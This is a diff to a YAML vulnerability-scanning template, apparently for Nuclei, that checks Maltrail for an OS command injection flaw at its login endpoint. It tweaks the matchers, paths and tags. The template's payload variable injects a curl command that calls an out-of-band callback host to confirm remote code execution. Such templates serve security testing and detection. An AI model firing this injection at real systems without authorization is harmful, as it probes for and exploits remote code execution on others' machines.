@@ -4,12 +4,12 @@ http:
   - part: interactsh_protocol
     type: word
     words:
+    - dns
     - http
-  matchers-condition: and
   method: POST
   path:
   - '{{BaseURL}}/login'
-  - '{{BaseURL}}login'
+  stop-at-first-match: true
 id: maltrail-os-command-injection
 info:
   author: Esonhugh-self-maintained
@@ -21,6 +21,6 @@ info:
   reference:
   - https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
   severity: critical
-  tags: rce,shell,oast
+  tags: rce
 variables:
   payload: curl+{{interactsh-url}}
